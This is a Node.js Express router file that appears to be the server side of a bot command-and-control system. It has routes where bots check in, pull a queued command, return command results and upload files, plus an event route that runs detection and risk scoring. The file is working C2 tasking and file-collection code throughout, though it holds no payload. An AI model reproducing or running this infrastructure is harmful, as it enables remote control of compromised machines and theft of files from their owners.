"use strict";

const path    = require("path");
const express = require("express");
const multer  = require("multer");

const { UPLOADS_DIR, MAX_EVENTS } = require("../config/constants");
const { botAuthed }               = require("../middleware/auth");
const { getOrCreate, recordNetlog } = require("../controllers/botController");
const { runDetection }            = require("../controllers/detectionEngine");
const { computeRiskScore }        = require("../controllers/detectionEngine");

const router = express.Router();

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, UPLOADS_DIR),
  filename: (req, file, cb) => {
    const id  = req.query.id || "unknown";
    const ext = path.extname(file.originalname) || ".bin";
    cb(null, `${id}_${Date.now()}${ext}`);
  },
});
const upload = multer({ storage, limits: { fileSize: 20 * 1024 * 1024 } });

router.get("/ping", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("Unauthorized");
  res.send("OK");
});

router.get("/checkin", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id, info = req.query.info || "";
  if (!id) return res.status(400).send("");
  const bot    = getOrCreate(id);
  bot.info     = info;
  bot.lastSeen = new Date().toISOString();
  recordNetlog(bot, req, res, 0);
  console.log(`[+] Checkin  bot=${id}`);
  res.status(200).send("");
});

router.get("/cmd", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id) return res.status(400).send("");
  const { bots } = require("../state");
  const bot = bots[id];
  if (!bot) return res.status(200).send("");
  bot.lastSeen   = new Date().toISOString();
  const cmd      = bot.pendingCmd || "";
  bot.pendingCmd = "";
  recordNetlog(bot, req, res, cmd.length);
  res.status(200).send(cmd);
});

router.get("/result", (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id, data = req.query.data || "";
  if (!id) return res.status(400).send("");
  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  bot.results.push({ time: new Date().toISOString(), data });
  recordNetlog(bot, req, res, data.length);
  console.log(`[result]  bot=${id}  ${data.substring(0, 80).replace(/%0A/g, " ")}`);
  res.status(200).send("");
});

router.post("/upload", upload.single("file"), (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id || !req.file) return res.status(400).send("bad request");
  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  bot.files.push(req.file.filename);
  recordNetlog(bot, req, res, req.file?.size || 0);
  console.log(`[upload]  bot=${id}  ${req.file.filename}`);
  res.status(200).send(req.file.filename);
});

router.post("/event", express.json({ limit: "64kb" }), (req, res) => {
  if (!botAuthed(req)) return res.status(403).send("");
  const id = req.query.id;
  if (!id) return res.status(400).send("");

  const evt = req.body;
  if (!evt || typeof evt !== "object") return res.status(400).send("");

  const bot = getOrCreate(id);
  bot.lastSeen = new Date().toISOString();
  evt.received = new Date().toISOString();

  bot.events.push(evt);
  if (bot.events.length > MAX_EVENTS) bot.events.splice(0, bot.events.length - MAX_EVENTS);

  const sev = (evt.sev || "info").toUpperCase();
  if (sev === "HIGH" || sev === "CRITICAL")
    console.log(`[EVENT:${sev}]  bot=${id}  ${evt.ev || evt.type}`);

  runDetection(bot, evt);
  computeRiskScore(bot);
  recordNetlog(bot, req, res, JSON.stringify(evt).length);

  res.status(200).send("");
});

module.exports = router;
